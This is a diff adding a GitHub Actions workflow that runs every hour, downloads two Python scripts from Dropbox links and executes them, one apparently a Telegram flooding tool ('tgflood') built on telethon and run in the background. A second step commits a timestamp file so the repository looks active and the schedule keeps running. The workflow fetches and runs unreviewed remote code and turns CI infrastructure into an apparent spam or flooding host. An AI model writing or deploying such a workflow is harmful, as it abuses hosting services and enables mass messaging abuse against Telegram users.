@@ -1,0 +1,36 @@
+name: Script
+
+on:
+  schedule:
+    - cron: '0 * * * *'
+  workflow_dispatch:
+
+permissions:
+  contents: write
+
+jobs:
+  build:
+    name: Start Building..
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v2
+
+      - name: Run Tgflood Script
+        run: |
+          pip install telethon
+          pip install --upgrade telethon
+          wget "https://www.dropbox.com/scl/fi/26ffz5jlehn5msg7ujt3i/time.py?rlkey=kof30j4q0o3uvf2krqrxdxhyl&st=3fq2amn4&dl=1" -O time.py
+          wget "https://www.dropbox.com/scl/fi/tn98x2uymesy1g2y1elcr/tgflood8.py?rlkey=k5b4u62t3zlmtcxsokorrn08k&st=r9jp7kfq&dl=1" -O tgflood.py
+          nohup python tgflood.py &
+          python time.py
+
+      - name: Keep Repository Active
+        run: |
+          echo "Last run: $(date)" > keepalive.txt
+          git config user.name "GitHub Actions"
+          git config user.email "actions@github.com"
+          git add keepalive.txt
+          git commit -m "Keep repository active - $(date)"
+          git push
